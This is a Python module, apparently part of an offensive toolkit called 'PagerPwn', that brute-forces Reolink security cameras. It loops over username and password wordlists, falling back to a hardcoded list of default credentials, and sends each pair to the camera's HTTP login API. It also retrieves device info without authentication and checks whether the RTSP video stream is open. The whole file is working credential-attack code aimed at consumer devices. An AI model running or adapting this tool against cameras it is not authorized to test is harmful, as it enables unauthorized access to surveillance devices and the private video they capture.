"""
rtsp_probe.py - Reolink camera HTTP/RTSP credential checker for PagerPwn

Tries default credentials against Reolink HTTP API and RTSP.
No video capture — just auth verification.

Module interface: run(config, ui_callback, stop_event) -> dict
"""

import os
import socket
import json
import time

HTTP_PORT = 80
RTSP_PORT = 554
TIMEOUT = 5

# ── Wordlist loader ──────────────────────────────────────────────────────────
_BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_WL_DIR = os.path.join(_BASE, "wordlists")


def _load_wordlist(filename):
    """Load a wordlist file, one entry per line. Blank lines = empty string."""
    path = os.path.join(_WL_DIR, filename)
    if not os.path.isfile(path):
        return []
    with open(path) as f:
        return [line.rstrip("\n\r") for line in f]


def _build_cred_list():
    """Build credential pairs from usernames.txt x passwords.txt."""
    users = _load_wordlist("usernames.txt")
    passwords = _load_wordlist("passwords.txt")
    if not users or not passwords:
        # Fallback if wordlists are missing
        return [("admin", ""), ("admin", "admin"), ("admin", "12345"),
                ("admin", "123456"), ("admin", "password"), ("root", "root")]
    # Pair each username with each password
    return [(u, p) for u in users for p in passwords]


CRED_LIST = _build_cred_list()


def _http_request(ip, port, path, timeout=5):
    """Minimal HTTP GET without urllib (fewer deps on pager)."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))

        request = f"GET {path} HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n"
        sock.sendall(request.encode())

        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk

        sock.close()
        return response.decode(errors="replace")
    except Exception:
        return None


def _try_reolink_api(ip, user, password, ui_callback):
    """Try Reolink HTTP API with given credentials."""
    # Reolink uses a JSON-based API
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((ip, HTTP_PORT))

        # Login request
        body = json.dumps([{
            "cmd": "Login",
            "action": 0,
            "param": {
                "User": {
                    "userName": user,
                    "password": password,
                }
            }
        }])

        request = (
            f"POST /api.cgi?cmd=Login HTTP/1.1\r\n"
            f"Host: {ip}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"{body}"
        )
        sock.sendall(request.encode())

        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk

        sock.close()
        text = response.decode(errors="replace")

        # Check for success in response
        if '"code" : 0' in text or '"value"' in text:
            return True, text

        return False, text

    except Exception as e:
        return False, str(e)


def _try_rtsp(ip, user, password):
    """Try RTSP OPTIONS with credentials via Digest/Basic."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((ip, RTSP_PORT))

        # First try without auth to see what's supported
        request = (
            f"OPTIONS rtsp://{ip}:{RTSP_PORT}/ RTSP/1.0\r\n"
            f"CSeq: 1\r\n"
            f"\r\n"
        )
        sock.sendall(request.encode())

        response = b""
        try:
            response = sock.recv(4096)
        except socket.timeout:
            pass

        text = response.decode(errors="replace")
        sock.close()

        # Check response
        if "200 OK" in text:
            return {"auth_required": False, "response": text[:200]}
        elif "401" in text:
            return {"auth_required": True, "response": text[:200]}

        return {"auth_required": None, "response": text[:200]}

    except Exception as e:
        return {"error": str(e)}


def _try_device_info(ip):
    """Try to get device info without auth."""
    resp = _http_request(ip, HTTP_PORT, "/api.cgi?cmd=GetDevInfo")
    if resp and ("model" in resp.lower() or "name" in resp.lower()):
        return resp
    return None


def run(config, ui_callback, stop_event=None):
    """
    Probe Reolink camera for default credentials.

    Returns:
        dict: {"auth_success": bool, "cred": str, "method": str,
               "device_info": str, "rtsp_status": dict}
    """
    target_ip = config.get("TARGETS", {}).get("Camera", "")
    result = {
        "auth_success": False,
        "cred": "",
        "method": "",
        "device_info": "",
        "rtsp_status": {},
    }

    # ── Connectivity check ────────────────────────────────────────────────────
    ui_callback("[CAMERA]", f"Checking {target_ip}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((target_ip, HTTP_PORT))
        s.close()
    except Exception:
        ui_callback("[CAMERA] OFFLINE", f"{target_ip} unreachable")
        time.sleep(2)
        return result

    # ── Device Info (no auth) ─────────────────────────────────────────────────
    ui_callback("[CAMERA]", "Getting device info...")
    dev_info = _try_device_info(target_ip)
    if dev_info:
        result["device_info"] = dev_info[:500]
        ui_callback("[CAMERA]", "Device info retrieved")

    # ── HTTP API Credential Check ─────────────────────────────────────────────
    total = len(CRED_LIST)
    for idx, (user, password) in enumerate(CRED_LIST, 1):
        if stop_event and stop_event.is_set():
            break

        cred_str = f"{user}:{password}" if password else f"{user}:(blank)"
        ui_callback(f"[CAMERA] {idx}/{total}", f"Trying {cred_str}")

        success, resp = _try_reolink_api(target_ip, user, password, ui_callback)
        if success:
            result["auth_success"] = True
            result["cred"] = f"{user}:{password}"
            result["method"] = "HTTP API"
            ui_callback("[CAMERA] AUTH OK!", f"Cred: {cred_str}")
            time.sleep(0.5)
            return result

        time.sleep(0.05)

    # ── RTSP Check ────────────────────────────────────────────────────────────
    ui_callback("[CAMERA]", "Checking RTSP...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((target_ip, RTSP_PORT))
        s.close()
        rtsp_open = True
    except Exception:
        rtsp_open = False

    if rtsp_open:
        rtsp_result = _try_rtsp(target_ip, "admin", "")
        result["rtsp_status"] = rtsp_result

        if rtsp_result.get("auth_required") is False:
            result["auth_success"] = True
            result["cred"] = "none (open)"
            result["method"] = "RTSP"
            ui_callback("[CAMERA] RTSP OPEN!", "No auth required")
        elif rtsp_result.get("auth_required"):
            ui_callback("[CAMERA] RTSP", "Auth required (401)")
        else:
            ui_callback("[CAMERA] RTSP", "Unknown response")
    else:
        ui_callback("[CAMERA]", "RTSP port closed")
        result["rtsp_status"] = {"error": "port closed"}

    time.sleep(1)

    if not result["auth_success"]:
        ui_callback("[CAMERA] DONE", "No default creds found")

    return result
